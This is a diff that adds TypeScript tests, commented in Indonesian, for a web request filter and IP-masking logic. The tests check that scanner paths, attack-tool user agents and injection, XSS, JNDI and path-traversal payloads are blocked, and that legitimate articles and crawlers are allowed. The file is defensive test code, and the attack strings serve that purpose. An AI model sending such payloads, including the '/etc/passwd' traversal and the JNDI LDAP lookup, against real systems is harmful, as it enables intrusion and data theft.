@@ -17,6 +17,8 @@ import { NextRequest } from 'next/server'
 import { proxy } from '../proxy'
 import { checkBearer, requireAdmin, requireCron, timingSafeEqual } from '../lib/http/auth'
 import { RULES } from '../lib/http/ratelimit'
+import { inspect } from '../lib/http/shield'
+import { maskIp, resetLocalBans } from '../lib/http/blocklist'
 
 // ---------------------------------------------------------------------------
 
@@ -54,6 +56,29 @@ async function headersFor(path: string): Promise<Headers> {
   const response = await proxy(new NextRequest(`https://contoh.test${path}`))
   return response.headers
 }
+
+/**
+ * Bangun satu permintaan buatan.
+ *
+ * Tiap pemanggilan memakai alamat berbeda. Tanpa itu, uji pertama yang memicu
+ * blokir akan membuat seluruh uji sesudahnya ditolak sebagai pengunjung yang
+ * sama — penjaganya bekerja persis seperti seharusnya, dan hasilnya seluruh
+ * berkas uji gagal karena alasan yang tidak ada hubungannya dengan yang diuji.
+ */
+let probeCounter = 0
+function probe(path: string, init: { ua?: string; method?: string } = {}): NextRequest {
+  probeCounter++
+  const headers = new Headers({ 'x-forwarded-for': `203.0.113.${probeCounter % 250}` })
+  if (init.ua !== undefined) headers.set('user-agent', init.ua)
+
+  return new NextRequest(`https://contoh.test${path}`, {
+    method: init.method ?? 'GET',
+    headers,
+  })
+}
+
+const BROWSER_UA =
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0 Safari/537.36'
 
 const run = async () => {
   // -------------------------------------------------------------------------
@@ -130,6 +155,196 @@ const run = async () => {
     assert(
       RULES.expensive.limit < RULES.ops.limit && RULES.ops.limit < RULES.read.limit,
       'kuota harus makin ketat untuk endpoint yang makin mahal',
+    )
+  })
+
+  // -------------------------------------------------------------------------
+  // Penyaring serangan
+  // -------------------------------------------------------------------------
+
+  await test('alamat pemindai ditolak', () => {
+    const paths = [
+      '/wp-admin/setup-config.php',
+      '/.env',
+      '/.git/config',
+      '/phpmyadmin/index.php',
+      '/backup.sql',
+      '/anything.php',
+    ]
+
+    for (const path of paths) {
+      const result = inspect(new Request(`https://contoh.test${path}`))
+      assert(result.verdict === 'block', `${path} seharusnya ditolak, bukan ${result.verdict}`)
+    }
+  })
+
+  await test('perkakas serangan ditolak walau alamatnya wajar', () => {
+    for (const ua of ['sqlmap/1.7', 'Nikto/2.5.0', 'Nuclei - Open-source', 'masscan/1.3']) {
+      const result = inspect(
+        new Request('https://contoh.test/api/v1/stats', { headers: { 'user-agent': ua } }),
+      )
+      assert(result.verdict === 'block', `${ua} seharusnya ditolak`)
+      assert(result.reason === 'attack-tool', `alasan tak terduga: ${result.reason}`)
+    }
+  })
+
+  await test('muatan suntikan ditolak', () => {
+    const attacks = [
+      "/api/v1/instruments?symbol=BBCA' UNION SELECT password FROM users--",
+      '/api/v1/news?slug=<script>alert(1)</script>',
+      '/api/v1/instruments?symbol=x&cb=javascript:alert(1)',
+      '/api/v1/news?q=${jndi:ldap://jahat.test/a}',
+      '/api/v1/instruments?id=1;drop table users',
+    ]
+
+    for (const path of attacks) {
+      const result = inspect(new Request(`https://contoh.test${path}`))
+      assert(result.verdict === 'block', `${path} seharusnya ditolak`)
+      assert(result.reason === 'injection', `alasan tak terduga untuk ${path}: ${result.reason}`)
+    }
+  })
+
+  await test('penelusuran direktori ditolak, termasuk yang disandikan', () => {
+    const attacks = [
+      '/api/v1/news/../../../../etc/passwd',
+      '/api/v1/news/%2e%2e%2f%2e%2e%2fetc%2fpasswd',
+      '/api/v1/instruments?file=../../secret',
+    ]
+
+    for (const path of attacks) {
+      const result = inspect(new Request(`https://contoh.test${path}`))
+      assert(result.verdict === 'block', `${path} seharusnya ditolak`)
+    }
+  })
+
+  await test('penyandian berlapis tidak membuat muatan lolos', () => {
+    // `%2527` adalah tanda kutip yang disandikan dua kali — persis cara yang
+    // dipakai untuk melewati pemeriksa yang hanya mendekode sekali.
+    const result = inspect(
+      new Request('https://contoh.test/api/v1/instruments?symbol=%2527%2520or%25201%253D1'),
+    )
+    assert(result.verdict === 'block', 'muatan bersandi berlapis seharusnya tetap tertangkap')
+  })
+
+  await test('permintaan wajar tidak ikut tertangkap', () => {
+    const honest = [
+      '/',
+      '/ringkasan',
+      '/instruments?symbol=BBCA&market=IDX',
+      '/berita/rupiah-menguat-pekan-ini',
+      '/api/v1/instruments/BTC-USD/candles?range=1y',
+      '/api/v1/news?page=2',
+      '/favicon.ico',
+      '/.well-known/security.txt',
+    ]
+
+    for (const path of honest) {
+      const result = inspect(
+        new Request(`https://contoh.test${path}`, { headers: { 'user-agent': BROWSER_UA } }),
+      )
+      assert(result.verdict === 'allow', `${path} salah tertangkap sebagai ${result.reason}`)
+    }
+  })
+
+  await test('judul warta yang mirip nama pemindai tidak ikut tertangkap', () => {
+    // Uji ini mengunci alasan kenapa pencocokannya per segmen, bukan per
+    // potongan teks. Semua alamat di bawah memuat nama yang ada di daftar
+    // pemindai, dan semuanya adalah artikel yang sah. Kalau suatu saat daftarnya
+    // kembali dicocokkan sebagai substring, uji inilah yang akan jatuh — bukan
+    // pembaca yang mendapati artikelnya hilang tanpa penjelasan.
+    const articles = [
+      '/warta/whmcs-jadi-sorotan-pasar-teknologi',
+      '/warta/pma-asing-masuk-sektor-tambang-nikel',
+      '/warta/shellfish-export-naik-tajam',
+      '/warta/credentials-digital-jadi-tren-fintech',
+      '/berita/jenkins-capital-rilis-laporan-kuartal',
+      '/api/v1/news/analisis-solar-dan-energi-terbarukan',
+    ]
+
+    for (const path of articles) {
+      const result = inspect(
+        new Request(`https://contoh.test${path}`, { headers: { 'user-agent': BROWSER_UA } }),
+      )
+      assert(result.verdict === 'allow', `${path} salah tertangkap sebagai ${result.reason}`)
+    }
+  })
+
+  await test('perayap mesin telusur tidak diblokir', () => {
+    // Blokir yang ikut menjaring Googlebot menghapus situs dari hasil pencarian,
+    // dan kerugian itu jauh lebih besar daripada yang dicegahnya.
+    const crawlers = [
+      'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+      'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
+    ]
+
+    for (const ua of crawlers) {
+      const result = inspect(new Request('https://contoh.test/berita', { headers: { 'user-agent': ua } }))
+      assert(result.verdict === 'allow', `${ua} salah tertangkap sebagai ${result.reason}`)
+    }
+  })
+
+  await test('klien otomatis hanya ditolak di jalur mahal', () => {
+    const request = () =>
+      new Request('https://contoh.test/api/v1/committee/deliberate', {
+        method: 'POST',
+        headers: { 'user-agent': 'python-requests/2.31.0' },
+      })
+
+    assert(
+      inspect(request()).verdict === 'allow',
+      'di jalur biasa, curl dan kawan-kawan tidak perlu dihalangi',
+    )
+    assert(
+      inspect(request(), { strict: true }).verdict === 'block',
+      'di jalur yang membelanjakan kuota model, klien otomatis harus ditolak',
+    )
+  })
+
+  await test('proxy menolak pemindai dengan 403, bukan 404 atau 200', async () => {
+    resetLocalBans()
+    const response = await proxy(probe('/wp-login.php'))
+    assert(response.status === 403, `status tak terduga: ${response.status}`)
+  })
+
+  await test('penolakan tidak membocorkan apa yang diperiksa', async () => {
+    resetLocalBans()
+    const scanner = await proxy(probe('/.env'))
+    const injection = await proxy(probe("/api/v1/news?slug=' or 1=1--"))
+
+    const first = await scanner.clone().text()
+    const second = await injection.clone().text()
+
+    assert(
+      !first.toLowerCase().includes('env') && !second.toLowerCase().includes('injection'),
+      'pesan penolakan tidak boleh menyebut apa yang memicunya',
+    )
+  })
+
+  await test('alamat ditopeng sebelum masuk catatan', () => {
+    assert(maskIp('103.47.12.199') === '103.47.12.0/24', 'oktet terakhir IPv4 harus dibuang')
+    assert(maskIp('2404:6800:4003:c00::64').endsWith('::/48'), 'IPv6 harus dipotong di /48')
+    assert(maskIp('unknown') === 'tidak diketahui', 'alamat tak dikenal harus punya sebutan sendiri')
+
+    // Yang penting bukan formatnya, melainkan bahwa alamat utuh tidak pernah
+    // bisa disusun ulang dari apa yang tersimpan.
+    assert(!maskIp('103.47.12.199').includes('199'), 'alamat utuh tidak boleh bisa dibaca kembali')
+  })
+
+  // -------------------------------------------------------------------------
+  // Kuota
+  // -------------------------------------------------------------------------
+
+  await test('kuota model paling ketat di seluruh daftar', () => {
+    const perMinute = (rule: { limit: number; windowSeconds: number }) =>
+      rule.limit / rule.windowSeconds
+
+    assert(
+      perMinute(RULES.llm) < perMinute(RULES.expensive),
+      'endpoint yang memanggil model harus lebih ketat daripada yang menarik data luar',
+    )
+    assert(
+      perMinute(RULES.auth) < perMinute(RULES.ops),
+      'endpoint yang menerima kata sandi harus lebih ketat daripada endpoint operasional',
     )
   })
 
